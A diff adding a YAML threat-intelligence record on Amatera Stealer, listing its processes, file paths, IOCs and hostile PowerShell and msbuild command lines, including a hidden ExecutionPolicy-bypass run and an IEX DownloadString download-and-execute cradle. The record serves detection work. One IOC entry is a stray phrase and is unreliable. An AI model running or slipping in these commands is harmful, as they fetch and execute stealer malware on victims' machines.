@@ -1,0 +1,54 @@
+description: Proofpoint identified a new, rebranded stealer based on ACR Stealer called
+  Amatera Stealer. It is delivered via web injects featuring sophisticated attack
+  chains.
+attribution: Unknown
+malware_families:
+- ACR Stealer
+- Amatera Stealer
+- GrMsk Stealer
+- Lumma Stealer
+- Rhadamanthys
+TTPs:
+  processes:
+  - OpenWith.exe
+  - msbuild.exe
+  - powershell.exe
+  - wscript.exe
+  - chrome.exe
+  commandline:
+  - C:\\Windows\\System32\\OpenWith.exe "powershell -WindowStyle Hidden -ExecutionPolicy
+    Bypass -File C:\\Users\\Public\\AmateraStealer.csproj"
+  - '"C:\\Program Files (x86)\\MSBuild\\15.0\\Bin\\msbuild.exe" "C:\\Users\\Public\\AmateraStealer.csproj"'
+  - powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\EarlyBird+ContextHijackInjector_x86x64.ps1
+  powershell:
+  - Invoke-RestMethod -Uri "https://cdn.discordapp.com/file/d/..." -OutFile "$env:TEMP\AmateraStealer.csproj"
+  - IEX (New-Object Net.WebClient).DownloadString("https://...")
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: cloudflare.com
+    port: '443'
+  - executable: msbuild.exe
+    destination_address: ''
+    port: ''
+  - executable: chrome.exe
+    destination_address: ''
+    port: ''
+  file_activity:
+  - C:\\Users\\Public\\AmateraStealer.csproj
+  - C:\\Users\\Public\\EarlyBird+ContextHijackInjector_x86x64.ps1
+  persistence: []
+  pipes: []
+  process_relations:
+  - OpenWith.exe -> msbuild.exe -> powershell.exe
+IOCs:
+- amaprox[.]icu
+- https://cdn.discordapp.com/file/d/...
+- zeroing out the payload
+authors:
+- Jeremy Hedges
+- Tommy Madjar
+reference: https://www.proofpoint.com/us/blog/threat-insight/amatera-stealer-rebranded-acr-stealer-improved-evasion-sophistication
+date_of_publication: June 16, 2025
+file_creation_date: June 18, 2025
